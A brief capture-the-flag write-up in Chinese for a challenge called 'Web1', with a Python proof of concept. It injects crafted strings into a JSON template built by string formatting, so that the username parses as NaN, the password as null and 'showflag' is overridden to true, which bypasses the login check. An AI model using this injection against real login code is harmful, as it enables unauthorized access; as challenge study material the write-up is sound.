# Web1
給你Source，利用json parse的問題讓None==None
```python
import os
import json

users_db = {
    'guest': 'guest',
    'admin': os.environ.get('PASSWORD', 'S3CR3T_P455W0RD')
}
print(users_db.get('mom'))

str1 = '","username":NaN,"test":"'
str2 = '","password":null,"showflag":true,"test":"'
user_data =  '{"showflag": false, "username": "%s", "password": "%s"}' % (
    str1, str2
)
user = json.loads(user_data)
print(users_db.get(user['username']) == user['password'])
```


